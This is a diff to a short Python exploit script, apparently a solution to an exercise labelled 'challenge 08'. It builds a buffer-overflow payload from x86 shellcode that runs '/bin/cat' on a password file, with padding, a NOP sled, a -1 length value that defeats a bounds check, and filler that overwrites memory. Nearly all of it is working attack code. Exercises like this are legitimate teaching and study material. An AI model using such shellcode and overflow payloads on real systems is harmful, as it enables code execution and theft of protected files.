@@ -1,10 +1,14 @@
 import struct
-  
+
 # custom shellcode from challenge 08 (catpw.s)
-shellcode = b'j\x0bX1\xd2\xbb\xaaswd\xc1\xeb\x08Sh.pas\x89\xe1Rh/cath/bin\x89\xe3RQS\x89\xe1\xcd\x80'
+shellcode = b'j\x0bX1\xd2RhsswdhA.pa\x8dL$\x01Rh/cath/bin\x89\xe3RQS\x89\xe1\xcd\x80'
+# add padding to the end of the shellcode so we dont overwrite it
+# (we push to the stack in the shellcode)
+shellcode += b'\xcc' * 16
 
 s = b''
-s += struct.pack("<i", -1) # -1 makes loop ignore bounds
+# -1 makes loop ignore bounds, so it copies until a null is found
+s += struct.pack("<i", -1)
 s += b'/' + shellcode.rjust(128, b'\x90')
 
 s += b'AAAABBBBCCCCDDDDEEEEFFFFGGGG'
